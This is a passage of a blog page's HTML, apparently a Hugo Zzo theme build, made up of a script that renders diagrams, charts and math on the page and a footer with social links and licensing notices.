
        if (elemParentNode !== document.body) {
          elemParentNode.parentNode.insertBefore(elem, elemParentNode);
          elemParentNode.parentNode.removeChild(elemParentNode);
        }

        var newElemWrapper = document.createElement('div');
        newElemWrapper.classList.add('mermaid');
        newElemWrapper.style.padding = '34px 4px 6px';
        newElemWrapper.innerHTML = elem.innerHTML;
        elem.replaceWith(newElemWrapper);
      });
    }
    

    

    
    if (lib && lib.includes('katex')) {
      var mathElements = document.getElementsByClassName('math');
      var options = {
        delimiters: [
          { left: "$$", right: "$$", display: true },
          { left: "\\[", right: "\\]", display: true },
          { left: "$", right: "$", display: false },
          { left: "\\(", right: "\\)", display: false }
        ],
      };

      renderMathInElement(document.querySelector('.single__contents'), options);
    }
    



    
    if (lib && lib.includes('flowchartjs')) {
      
      var options = JSON.parse("{\"arrow-end\":\"block\",\"element-color\":\"black\",\"fill\":\"white\",\"flowstate\":{\"approved\":{\"fill\":\"#58C4A3\",\"font-size\":12,\"no-text\":\"n/a\",\"yes-text\":\"APPROVED\"},\"current\":{\"fill\":\"yellow\",\"font-color\":\"red\",\"font-weight\":\"bold\"},\"future\":{\"fill\":\"#FFFF99\"},\"invalid\":{\"fill\":\"#444444\"},\"past\":{\"fill\":\"#CCCCCC\",\"font-size\":12},\"rejected\":{\"fill\":\"#C45879\",\"font-size\":12,\"no-text\":\"REJECTED\",\"yes-text\":\"n/a\"},\"request\":{\"fill\":\"blue\"}},\"font-color\":\"black\",\"font-size\":14,\"line-color\":\"black\",\"line-length\":50,\"line-width\":3,\"no-text\":\"no\",\"scale\":1,\"symbols\":{\"end\":{\"class\":\"end-element\"},\"start\":{\"element-color\":\"green\",\"fill\":\"yellow\",\"font-color\":\"red\"}},\"text-margin\":10,\"x\":0,\"y\":0,\"yes-text\":\"yes\"}");
      var jsonContent = null;

      var flowchartPrefix = "language-flowchart";
      var index = 0;
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + flowchartPrefix + "]"), function(x){
          x.style.display = 'none'
          x.parentNode.style.backgroundColor = "transparent"
          jsonContent = x.innerText;

          var node0 = document.createElement('div');
          node0.id = 'flowchart' + index;
          x.parentNode.insertBefore(node0, x);

          var diagram = flowchart.parse(jsonContent);
          diagram.drawSVG("flowchart"+index, options);

          index +=1;
      });      
    }
    

    

    
    document.querySelectorAll("mjx-container").forEach(function (x) {
      x.parentElement.classList += 'has-jax'
    });
    



    
    if (lib && lib.includes('msc')) {
      
      var options = JSON.parse("{\"theme\":\"hand\"}");
      var jsonContent = null;

      var index = 0;
      var chartPrefix = "language-msc";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        node0.id = 'msc' + index;
        x.parentNode.insertBefore(node0, x);
        var diagram = Diagram.parse(jsonContent);
        diagram.drawSVG("msc" + index, options);
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('chart')) {
      var borderColor = "#666";
      var bgColor = "#ddd";
      var borderWidth = 2;

      Chart.defaults.global.elements.rectangle.borderWidth = borderWidth;
      Chart.defaults.global.elements.rectangle.borderColor = borderColor;
      Chart.defaults.global.elements.rectangle.backgroundColor = bgColor;

      Chart.defaults.global.elements.line.borderWidth = borderWidth;
      Chart.defaults.global.elements.line.borderColor = borderColor;
      Chart.defaults.global.elements.line.backgroundColor = bgColor;

      Chart.defaults.global.elements.point.borderWidth = borderWidth;
      Chart.defaults.global.elements.point.borderColor = borderColor;
      Chart.defaults.global.elements.point.backgroundColor = bgColor;

      var chartPrefix = "language-chart";
      var index = 0;
      var jsonContent = null;

      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('canvas');
        var source = null;
        node0.height = 200;
        node0.style.height = 200;
        node0.id = 'myChart' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        var ctx = document.getElementById('myChart' + index).getContext('2d');
        var myChart = new Chart(ctx, source);
        index += 1;
      });            
    }
    



    
    if (lib && lib.includes('wavedrom')) {
      var wavePrefix = "language-wave";
      var index = 0;
      var jsonContent = null;
      
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + wavePrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        var source = null;
        node0.id = 'WaveDrom_Display_' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        WaveDrom.RenderWaveForm(index, source, "WaveDrom_Display_");
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('viz')) {
      var vizPrefix = "language-viz-";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        var engine;
        x.getAttribute("class").split(" ").forEach(function (cls) {
          if (cls.startsWith(vizPrefix)) {
            engine = cls.substr(vizPrefix.length);
          }
        });
        var viz = new Viz();
        viz.renderSVGElement(x.innerText, { engine: engine })
          .then(function (element) {
            element.style.width = "100%";
            x.parentNode.insertBefore(element, x);
          })
      });
    }
    
    
  }
</script>


            
            <footer class="footer">
    
    
<div class="footer__social">
  <div class="social">
    
            
    
            
    
            
    
      
      <a href="javascript:location.href%20=%20%27mailto:%27%20&#43;%20[%27noobintheshell%27,%27protonmail.com%27].join%28%27@%27%29" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
            
    
            
    
            
    
      
      <a href="https://github.com/noobintheshell" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
      
      <a href="https://twitter.com/noobintheshell_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
    
  
  
    
      <a href="https://noobintheshell.com/posts/index.xml" type="application/rss+xml" title="RSS" aria-label="RSS Feed Link">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><circle fill="currentColor" cx="6.18" cy="17.82" r="2.18"/><path fill="currentColor" d="M5.59 10.23c-.84-.14-1.59.55-1.59 1.4 0 .71.53 1.28 1.23 1.4 2.92.51 5.22 2.82 5.74 5.74.12.7.69 1.23 1.4 1.23.85 0 1.54-.75 1.41-1.59-.68-4.2-3.99-7.51-8.19-8.18zm-.03-5.71C4.73 4.43 4 5.1 4 5.93c0 .73.55 1.33 1.27 1.4 6.01.6 10.79 5.38 11.39 11.39.07.73.67 1.28 1.4 1.28.84 0 1.5-.73 1.42-1.56-.73-7.34-6.57-13.19-13.92-13.92z"/></svg>
      </a>
    
  


  </div>
</div>

    
<div id="gtt">
  <div class="gtt">
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 14.71L12 10.83l3.88 3.88c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L12.7 8.71c-.39-.39-1.02-.39-1.41 0L6.7 13.3c-.39.39-.39 1.02 0 1.41.39.38 1.03.39 1.42 0z"/></svg>
  </div>
</div>

    <hr />

    <div class="basicflex flexwrap">
        
            
        
            
        
    </div>

    <div class="footer__poweredby">
        
                
            <p class="caption">
                
                    
                    

                    
                        2022, Some Rights Reserved -<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA</a>
                    
                
            </p>
        

        
            <p class="caption">Powered by <a href="https://gohugo.io/" target="_blank" rel="noreferrer">Hugo</a> and the <a href="https://github.com/zzossig/hugo-theme-zzo" target="_blank" rel="noreferrer">Zzo theme</a></p>
        
        
    </div> 
</footer>
        </div>
        





<div class="wrapper__right hide" data-pad="true" dir="ltr">
  <script>document.querySelector('.wrapper__right').classList.remove('hide')</script>
  
</div>

    </div>
</body>

</html>